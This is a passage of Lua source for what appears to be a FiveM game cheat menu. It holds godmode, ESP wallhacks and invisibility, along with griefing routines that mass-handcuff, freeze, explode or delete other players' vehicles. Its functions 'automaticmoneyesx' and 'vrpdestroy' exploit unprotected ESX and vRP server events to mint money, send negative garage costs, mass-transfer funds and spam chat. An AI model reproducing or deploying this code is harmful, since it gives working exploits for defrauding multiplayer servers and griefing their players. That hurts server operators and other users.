        local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
        local targetPos = SubVectors(pos1, pos2)

        ApplyForce(entity, targetPos)
      end

      function getEntity(player)
        local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
        return entity
      end

      function GetInputMode()
        return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
      end



      function DrawSpecialText(m_text, showtime)
        SetTextEntry_2("STRING")
        AddTextComponentString(m_text)
        DrawSubtitleTimed(showtime, 1)
      end




      Citizen.CreateThread(function()

      while true do
        Wait( 1 )
        for id = 0, 128 do

          if NetworkIsPlayerActive( id ) and GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then

ped = GetPlayerPed( id )
blip = GetBlipFromEntity( ped )

x1, y1, z1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
x2, y2, z2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
distance = math.floor(GetDistanceBetweenCoords(x1,  y1,  z1,  x2,  y2,  z2,  true))

headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )
wantedLvl = GetPlayerWantedLevel( id )

if showsprite then
  Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, true )
  if wantedLvl then

    Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, true )
    Citizen.InvokeNative( 0xCF228E2AA03099C3, headId, wantedLvl )

  else

    Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false )

  end
else
  Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false )
  Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false )
  Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, false )
end

local function DrawText3D(position, text, r,g,b) 
    local onScreen,_x,_y=World3dToScreen2d(position.x,position.y,position.z+1)
    local dist = #(GetGameplayCamCoords()-position)
	
    local scale = (1/dist)*2
    local fov = (1/GetGameplayCamFov())*100
    local scale = scale*fov
	
    if onScreen then
        if not useCustomScale then
            SetTextScale(0.0*scale, 0.55*scale)
			else 
            SetTextScale(0.0*scale, customScale)
		end
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(r, g, b, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x,_y)
	end
end
local function DrawText3DV2(position, text, r,g,b) 
    local onScreen,_x,_y=World3dToScreen2d(position.x,position.y,position.z+1.2)
    local dist = #(GetGameplayCamCoords()-position)
	
    local scale = (1/dist)*2
    local fov = (1/GetGameplayCamFov())*100
    local scale = scale*fov
	
    if onScreen then
        if not useCustomScale then
            SetTextScale(0.0*scale, 0.55*scale)
			else 
            SetTextScale(0.0*scale, customScale)
		end
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(r, g, b, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x,_y)
	end
end

if PlayerOn then
	for _, id in ipairs(GetActivePlayers()) do
		local targetPed = GetPlayerPed(id)
		if targetPed ~= PlayerPedId() then
			if playerDistances[id] then
				if playerDistances[id] < disPlayerNames then
					local targetPedCords = GetEntityCoords(targetPed)
					
					if NetworkIsPlayerTalking(id) then
						local onScreen,_x,_y = World3dToScreen2d(targetPedCords[1],targetPedCords[2], targetPedCords[3] + 1.1)
						local p = GetGameplayCamCoords()
						local distance = GetDistanceBetweenCoords(p.x, p.y, p.z, x, y, z, 1)
						local scale = (1 / distance) * 2
						local fov = (1 / GetGameplayCamFov()) * 100
						local HealthMax = GetEntityMaxHealth(GetPlayerPed(id))
						local RemoveHealth = GetEntityHealth(GetPlayerPed(id))
						if onScreen then
							DrawText3DV2(targetPedCords, string.format("[%s/%s]",RemoveHealth - 100,HealthMax - 100), 255,255,255)
						end
						DrawText3D(targetPedCords, GetPlayerServerId(id)..' | '..GetPlayerName(id), 247,124,24)
						DrawMarker(27, targetPedCords.x, targetPedCords.y, targetPedCords.z-0.97, 0, 0, 0, 0, 0, 0, 1.001, 1.0001, 0.5001, 173, 216, 230, 100, 0, 0, 0, 0)
						else
						local onScreen,_x,_y = World3dToScreen2d(targetPedCords[1],targetPedCords[2], targetPedCords[3] + 1.1)
						local p = GetGameplayCamCoords()
						local distance = GetDistanceBetweenCoords(p.x, p.y, p.z, x, y, z, 1)
						local scale = (1 / distance) * 2
						local fov = (1 / GetGameplayCamFov()) * 100
						local HealthMax = GetEntityMaxHealth(GetPlayerPed(id))
						local RemoveHealth = GetEntityHealth(GetPlayerPed(id))
						if onScreen then
							DrawText3DV2(targetPedCords, string.format("[%s/%s]",RemoveHealth - 100,HealthMax - 100), 255,255,255)
						end
						DrawText3D(targetPedCords, GetPlayerServerId(id)..' | '..GetPlayerName(id), 255,255,255)
					end
				end
			end
		end
	end
end

if showblip then

  if not DoesBlipExist( blip ) then
    blip = AddBlipForEntity( ped )
    SetBlipSprite( blip, 1 )
    Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
    SetBlipNameToPlayerName(blip, id)

  else

    veh = GetVehiclePedIsIn( ped, false )
    blipSprite = GetBlipSprite( blip )

    if not GetEntityHealth( ped ) then

      if blipSprite ~= 274 then

        SetBlipSprite( blip, 274 )
        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
        SetBlipNameToPlayerName(blip, id)

      end

    elseif veh then

      vehClass = GetVehicleClass( veh )
      vehModel = GetEntityModel( veh )

      if vehClass == 15 then

        if blipSprite ~= 422 then

          SetBlipSprite( blip, 422 )
          Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
          SetBlipNameToPlayerName(blip, id)

        end

      elseif vehClass == 16 then

        if vehModel == GetHashKey( "besra" ) or vehModel == GetHashKey( "hydra" )
        or vehModel == GetHashKey( "lazer" ) then

          if blipSprite ~= 424 then

SetBlipSprite( blip, 424 )
Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
SetBlipNameToPlayerName(blip, id)

          end

        elseif blipSprite ~= 423 then

          SetBlipSprite( blip, 423 )
          Citizen.InvokeNative (0x5FBCA48327B914DF, blip, false )
        end
      elseif vehClass == 14 then
        if blipSprite ~= 427 then
          SetBlipSprite( blip, 427 )
          Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
        end
      elseif vehModel == GetHashKey( "insurgent" ) or vehModel == GetHashKey( "insurgent2" )
        or vehModel == GetHashKey( "limo2" ) then
          if blipSprite ~= 426 then
SetBlipSprite( blip, 426 )
Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
SetBlipNameToPlayerName(blip, id)
          end
        elseif vehModel == GetHashKey( "rhino" ) then
          if blipSprite ~= 421 then
SetBlipSprite( blip, 421 )
Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
SetBlipNameToPlayerName(blip, id)
          end
        elseif blipSprite ~= 1 then
          SetBlipSprite( blip, 1 )
          Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
          SetBlipNameToPlayerName(blip, id)
        end
        passengers = GetVehicleNumberOfPassengers( veh )
        if passengers then
          if not IsVehicleSeatFree( veh, -1 ) then
passengers = passengers + 1
          end
          ShowNumberOnBlip( blip, passengers )
        else
          HideNumberOnBlip( blip )
        end
      else
        HideNumberOnBlip( blip )
        if blipSprite ~= 1 then
          SetBlipSprite( blip, 1 )
          Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
          SetBlipNameToPlayerName(blip, id)
        end
      end
      SetBlipRotation( blip, math.ceil( GetEntityHeading( veh ) ) ) -- update rotation
      SetBlipNameToPlayerName( blip, id )
      SetBlipScale( blip,  0.85 )
      if IsPauseMenuActive() then
        SetBlipAlpha( blip, 255 )
      else
        x1, y1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
        x2, y2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
        distance = ( math.floor( math.abs( math.sqrt( ( x1 - x2 ) * ( x1 - x2 ) + ( y1 - y2 ) * ( y1 - y2 ) ) ) / -1 ) ) + 900
        if distance < 0 then
          distance = 0
        elseif distance > 255 then
          distance = 255
        end
        SetBlipAlpha( blip, distance )
      end
    end
  else
    RemoveBlip(blip)
  end
end
          end
        end
        end)

        local entityEnumerator = {
          __gc = function(enum)
          if enum.destructor and enum.handle then
enum.destructor(enum.handle)
          end
          enum.destructor = nil
          enum.handle = nil
        end
      }

      function EnumerateEntities(initFunc, moveFunc, disposeFunc)
        return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
          disposeFunc(iter)
          return
        end

        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)

        local next = true
        repeat
          coroutine.yield(id)
          next, id = moveFunc(iter)
        until not next

        enum.destructor, enum.handle = nil, nil
        disposeFunc(iter)
        end)
      end

      function EnumeratePeds()
        return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
      end

      function EnumerateVehicles()
        return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
      end

      function EnumerateObjects()
        return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
      end

      function RotationToDirection(rotation)
        local retz = rotation.z * 0.0174532924
        local retx = rotation.x * 0.0174532924
        local absx = math.abs(math.cos(retx))

        return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
      end

      function OscillateEntity(entity, entityCoords, position, angleFreq, dampRatio)
        if entity ~= 0 and entity ~= nil then
          local direction = ((position - entityCoords) * (angleFreq * angleFreq)) - (2.0 * angleFreq * dampRatio * GetEntityVelocity(entity))
          ApplyForceToEntity(entity, 3, direction.x, direction.y, direction.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
        end
      end

      local invisible = true

      Citizen.CreateThread(
      function()
        while Enabled do

          if RichEnable then      
      SetRichPresence(RichContent)
      SetDiscordAppId(appID)
      SetDiscordRichPresenceAssetText(appText)
      SetDiscordRichPresenceAsset(appAsset)
      SetDiscordRichPresenceAssetSmall(appAssett)
      SetDiscordRichPresenceAssetSmallTeax(appTextSmall)
    else
      SetRichPresence(0)
      SetDiscordAppId(0)
      SetDiscordRichPresenceAssetText(0)
      SetDiscordRichPresenceAsset(0)
      SetDiscordRichPresenceAssetSmall(0)
      SetDiscordRichPresenceAssetSmallTeax(0)
    end

          Citizen.Wait(0)

          SetPlayerInvincible(PlayerId(), Godmode)
          SetEntityInvincible(PlayerPedId(-1), Godmode)
          SetEntityVisible(GetPlayerPed(-1), invisible, 0)

          if SuperJump then
SetSuperJumpThisFrame(PlayerId(-1))
          end

          if InfStamina then
RestorePlayerStamina(PlayerId(-1), 1.0)
          end

          if fastrun then
SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
          else
SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
          end

          if VehicleGun then
local VehicleGunVehicle = "Freight"
local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
  notify("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!", false)
  GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
  SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
  if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
    if IsPedShooting(GetPlayerPed(-1)) then
      while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
        Citizen.Wait(0)
        RequestModel(GetHashKey(VehicleGunVehicle))
      end
      local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
      SetEntityAsNoLongerNeeded(veh)
      SetVehicleForwardSpeed(veh, 150.0)
    end
  end
end
          end

          if DeleteGun then
local cB = getEntity(PlayerId(-1))
if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
  notify(
  '~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!'
  )
  GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
  SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
  if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
    if IsPlayerFreeAiming(PlayerId(-1)) then
      if IsEntityAPed(cB) then
        if IsPedInAnyVehicle(cB, true) then
          if IsControlJustReleased(1, 142) then
SetEntityAsMissionEntity(GetVehiclePedIsIn(cB, true), 1, 1)
DeleteEntity(GetVehiclePedIsIn(cB, true))
SetEntityAsMissionEntity(cB, 1, 1)
DeleteEntity(cB)
notify('~g~Deleted!')
          end
        else
          if IsControlJustReleased(1, 142) then
SetEntityAsMissionEntity(cB, 1, 1)
DeleteEntity(cB)
notify('~g~Deleted!')
          end
        end
      else
        if IsControlJustReleased(1, 142) then
          SetEntityAsMissionEntity(cB, 1, 1)
          DeleteEntity(cB)
          notify('~g~Deleted!')
        end
      end
    end
  end
end
          end

if TamProHackModZ == nil then
  print('Lynx FTW')
  SetGamePaused(true)
end

if freezeall then
  for i = 0, 128 do
      TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
      TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
      TriggerServerEvent("cuffServer", GetPlayerServerId(i))
      TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
      TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
      TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
      TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
    end
  end

          if fuckallcars then
for playerVeh in EnumerateVehicles() do
  if (not IsPedAPlayer(GetPedInVehicleSeat(playerVeh, -1))) then
    SetVehicleHasBeenOwnedByPlayer(playerVeh, false)
    SetEntityAsMissionEntity(playerVeh, true, true)
    StartVehicleAlarm(playerVeh)
    DetachVehicleWindscreen(playerVeh)
    SmashVehicleWindow(playerVeh, 0)
    SmashVehicleWindow(playerVeh, 1)
    SmashVehicleWindow(playerVeh, 2)
    SmashVehicleWindow(playerVeh, 3)
    SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
    SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
    SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
    SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
    SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
    SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
    SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
    SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
    SetVehicleDoorBroken(playerVeh, 0, true)
    SetVehicleDoorBroken(playerVeh, 1, true)
    SetVehicleDoorBroken(playerVeh, 2, true)
    SetVehicleDoorBroken(playerVeh, 3, true)
    SetVehicleDoorBroken(playerVeh, 4, true)
    SetVehicleDoorBroken(playerVeh, 5, true)
    SetVehicleDoorBroken(playerVeh, 6, true)
    SetVehicleDoorBroken(playerVeh, 7, true)
    SetVehicleLights(playerVeh, 1)
    Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
    SetVehicleNumberPlateTextIndex(playerVeh, 5)
    SetVehicleNumberPlateText(playerVeh, "HighTachMenu")
    SetVehicleDirtLevel(playerVeh, 10.0)
    SetVehicleModColor_1(playerVeh, 1)
    SetVehicleModColor_2(playerVeh, 1)
    SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
    SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
    SetVehicleBurnout(playerVeh, true)
  end
end
          end

      if cardz then
local pbase = GetActivePlayers()
for i = 1, #pbase do
  if IsPedInAnyVehicle(GetPlayerPed(pbase[i]), true) then
    ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
  end
end
    end

    if gundz then
local pbase = GetActivePlayers()
for i = 1, #pbase do
  if i == PlayerPedId(-1) then i=i+1 end
  if IsPedShooting(GetPlayerPed(pbase[i])) then
    ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
  end
end
    end

          if destroyvehicles then
for vehicle in EnumerateVehicles() do
  if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
    NetworkRequestControlOfEntity(vehicle)
    SetVehicleUndriveable(vehicle,true)
    SetVehicleEngineHealth(vehicle, 0)
  end
end
          end

          if alarmvehicles then
for vehicle in EnumerateVehicles() do
  if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
  NetworkRequestControlOfEntity(vehicle)
  SetVehicleAlarmTimeLeft(vehicle, 500)
    SetVehicleAlarm(vehicle,true)
    StartVehicleAlarm(vehicle)
  end
end
      end
      
      if lolcars then
for vehicle in EnumerateVehicles() do
  RequestControlOnce(vehicle)
  ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
end
    end

    if TamProHackPRO ~= "HighTachMenuu" then
      ForceSocialClubUpdate()
    end


          if explodevehicles then
for vehicle in EnumerateVehicles() do
  if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
    NetworkRequestControlOfEntity(vehicle)
    NetworkExplodeVehicle(vehicle, true, true, false)
  end
end
          end

          if huntspam then
Citizen.Wait(1)
TSE('esx-qalle-hunting:reward', 20000)
TSE('esx-qalle-hunting:sell')
          end

          if deletenearestvehicle then
for vehicle in EnumerateVehicles() do
  if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
    SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
    DeleteEntity(GetVehiclePedIsIn(vehicle, true))
    SetEntityAsMissionEntity(vehicle, 1, 1)
    DeleteEntity(vehicle)
  end
end
          end

          if esp then
for i=1,128 do
  if  ((NetworkIsPlayerActive( i )) and GetPlayerPed( i ) ~= GetPlayerPed( -1 )) then
    local ra = RGB(1.0)
    local pPed = GetPlayerPed(i)
    local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId(-1)))
    local x, y, z = table.unpack(GetEntityCoords(pPed))
    local disPlayerNames = 130
    local disPlayerNamesz = 999999
      if nameabove then
        distance = math.floor(GetDistanceBetweenCoords(cx,  cy,  cz,  x,  y,  z,  true))
          if ((distance < disPlayerNames)) then
if NetworkIsPlayerTalking( i ) then
  DrawText3D(x, y, z+1.2, GetPlayerServerId(i).."  |  "..GetPlayerName(i), ra.r,ra.g,ra.b)
else
  DrawText3D(x, y, z+1.2, GetPlayerServerId(i).."  |  "..GetPlayerName(i), 255,255,255)
end
          end
      end
    local message =
    "~r~~h~: " ..
    GetPlayerName(i) ..
    GetPlayerServerId(i) ..
    "\n~h~~y~ Dist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
    if IsPedInAnyVehicle(pPed, true) then
           local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
      message = message .. "\nVeh: " .. VehName
    end
    if ((distance < disPlayerNamesz)) then
    if espinfo and esp then
      DrawText3D(x, y, z + 1.0, message, 255, 255, 255)
    end
    if espbox and esp then
      LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
      LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
      LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
      LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
      LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
      LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
      LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

      TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
      TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
      TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
      TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
      TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
      TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
      TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

      ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
      ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
      ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
      ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
      ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
      ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
      ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
      ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

     DrawLine(ConnectorOneBegin.x, ConnectorOneBegin.y, ConnectorOneBegin.z, ConnectorOneEnd.x, ConnectorOneEnd.y, ConnectorOneEnd.z, 139, 0, 0, 255)
	DrawLine(ConnectorTwoBegin.x, ConnectorTwoBegin.y, ConnectorTwoBegin.z, ConnectorTwoEnd.x, ConnectorTwoEnd.y, ConnectorTwoEnd.z, 139, 0, 0, 255)
	DrawLine(ConnectorThreeBegin.x, ConnectorThreeBegin.y, ConnectorThreeBegin.z, ConnectorThreeEnd.x, ConnectorThreeEnd.y, ConnectorThreeEnd.z, 139, 0, 0, 255)
	DrawLine(ConnectorFourBegin.x, ConnectorFourBegin.y, ConnectorFourBegin.z, ConnectorFourEnd.x, ConnectorFourEnd.y, ConnectorFourEnd.z, 139, 0, 0, 255)
	DrawLine(LineOneBegin.x, LineOneBegin.y, LineOneBegin.z, LineOneEnd.x, LineOneEnd.y, LineOneEnd.z, 139, 0, 0, 255)
	DrawLine(LineTwoBegin.x, LineTwoBegin.y, LineTwoBegin.z, LineTwoEnd.x, LineTwoEnd.y, LineTwoEnd.z, 139, 0, 0, 255)
	DrawLine(LineThreeBegin.x, LineThreeBegin.y, LineThreeBegin.z, LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, 139, 0, 0, 255)
	DrawLine(LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, LineFourBegin.x, LineFourBegin.y, LineFourBegin.z, 139, 0, 0, 255)
	DrawLine(TLineOneBegin.x, TLineOneBegin.y, TLineOneBegin.z, TLineOneEnd.x, TLineOneEnd.y, TLineOneEnd.z, 139, 0, 0, 255)
	DrawLine(TLineTwoBegin.x, TLineTwoBegin.y, TLineTwoBegin.z, TLineTwoEnd.x, TLineTwoEnd.y, TLineTwoEnd.z, 139, 0, 0, 255)
	DrawLine(TLineThreeBegin.x, TLineThreeBegin.y, TLineThreeBegin.z, TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, 139, 0, 0, 255)
	DrawLine(TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, TLineFourBegin.x, TLineFourBegin.y, TLineFourBegin.z, 139, 0, 0, 255)
    end
    if esplines and esp then
      DrawLine(cx, cy, cz, x, y, z, 139, 0, 0, 255)
    end
  end
end
          end
          end

          if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
          end

          if waterp and IsPedInAnyVehicle(PlayerPedId(-1), true) then
SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), true, true, true)
          end

          if oneshot then
SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
local gotEntity = getEntity(PlayerId(-1))
if IsEntityAPed(gotEntity) then
  if IsPedInAnyVehicle(gotEntity, true) then
    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
      if IsControlJustReleased(1, 69) then
        NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
      end
    else
      if IsControlJustReleased(1, 142) and oneshotcar then
        NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
      end
    end
  end
end
          else
SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
          end

          if crosshair then
ShowHudComponentThisFrame(14)
          end

          if crosshairc then
DrawTxt("~r~+", 0.495, 0.484)
          end

          if crosshairc2 then
DrawTxt("~r~.", 0.4968, 0.478)
          end

          if dio then
DoJesusTick(JesusRadius)
          end


          if showCoords then
x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
roundx = tonumber(string.format("%.2f", x))
roundy = tonumber(string.format("%.2f", y))
roundz = tonumber(string.format("%.2f", z))

DrawTxt("~r~X:~s~ "..roundx, 0.05, 0.00)
DrawTxt("~r~Y:~s~ "..roundy, 0.13, 0.00)
DrawTxt("~r~Z:~s~ "..roundz, 0.20, 0.00)
          end



         function automaticmoneyesx()
local result = KeyboardInput("Warning, this value can be multiplied!!!", "", 100)
  if result ~= "" then
    local confirm = KeyboardInput("Are you sure? y/n", "", 0)
    if confirm == "y" then
    notify("~g~Testing all ~y~ESX ~g~scripts~s~.", true)
    TSE("esx_carthief:pay", result)
    TSE("esx_jobs:caution", "give_back", result)
    TSE("esx_fueldelivery:pay", result)
    TSE("esx_carthief:pay", result)
    TSE("esx_godirtyjob:pay", result)
    TSE("esx_pizza:pay", result)
    TSE("esx_ranger:pay", result)
    TSE("esx_garbagejob:pay", result)    
    TSE("AdminMenu:giveBank", result)
    TSE("AdminMenu:giveCash", result)
    TSE("esx_gopostaljob:pay", result)
    TSE("esx_banksecurity:pay", result)
    TSE("esx_slotmachine:sv:2", result)
    TriggerServerEvent('vrp_slotmachine:server:2', result)
  	TriggerServerEvent("esx_pizza:pay", result)
  	TriggerServerEvent('esx_jobs:caution', 'give_back', result)
  	TriggerServerEvent('lscustoms:payGarage', result)
  	TriggerServerEvent('esx_tankerjob:pay', result)
  	TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
  	TriggerServerEvent("esx_ranger:pay", result)
  	TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
  	TriggerServerEvent('gambling:spend', result)
  	TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
  	TriggerServerEvent('esx_garbagejob:pay', result)
  	TriggerServerEvent("esx_gopostaljob:pay", result)
  	TriggerServerEvent('esx_slotmachine:sv:2', result)
  	TriggerServerEvent('esx_truckerjob:pay', result)
  	TriggerServerEvent('esx_moneywash:deposit', result)
  	TriggerServerEvent('esx_moneywash:withdraw', result)
  	TriggerServerEvent('esx_moneywash:deposit', result)
    TriggerServerEvent("esx_banksecurity:pay", result)
  	TriggerServerEvent("esx_godirtyjob:pay", result)
  	TriggerServerEvent('mission:completed', result)
  	TriggerServerEvent('truckerJob:success',result)
  	TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
  	TriggerServerEvent("dropOff", result)
  	TriggerServerEvent('delivery:success', result)
    TriggerServerEvent ('taxi:success', result)
    TriggerServerEvent("lscustoms:payGarage", {costs = -result})
    TriggerServerEvent("vrp_slotmachine:server:2", result)
    TriggerServerEvent("bank:deposit", result)
    TriggerServerEvent("bank:withdraw", result)
    TriggerServerEvent('vrp_slotmachine:server:2', result)
    TriggerServerEvent('bank:withdraw', result)
    TriggerServerEvent('bank:deposit', result)
    TriggerServerEvent('dmv:success')
    TriggerServerEvent('lscustoms:payGarage', {costs = -result})
    TriggerServerEvent('lscustoms:payGarage', {costs = -result})
    TriggerServerEvent('lscustoms:payGarage', {costs = -result})
    TriggerServerEvent('lscustoms:payGarage', {costs = -result})
  elseif confirm == "n" then
    notify("~b~Operation cancelled~s~.", false)
  else
    notify("~b~Invalid Confirmation~s~.", true)
    notify("~b~Operation cancelled~s~.", false)
  end
end
          end

        function vrpdestroy()
for c = 0, 9 do
  TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."HighTach.com - Hello guys!")
end
TSE("lscustoms:payGarage", {costs = -99999999})
TSE("vrp_slotmachine:server:2",999999999)
TSE("bank:deposit", 999999999)
for i=0,1000 do
TSE('paycheck:bonus')
TSE('paycheck:salary')
end
local q = 99999
for k= 1,3000 do
TSE("bank:transfer", k, q)
end
          end

      if vrpdbc then
for i=0,10 do
  for veh in EnumerateVehicles() do
    Citizen.InvokeNative(0xAD738C3085FE7E11, veh, true, true)
     
    if DoesEntityExist(veh) then
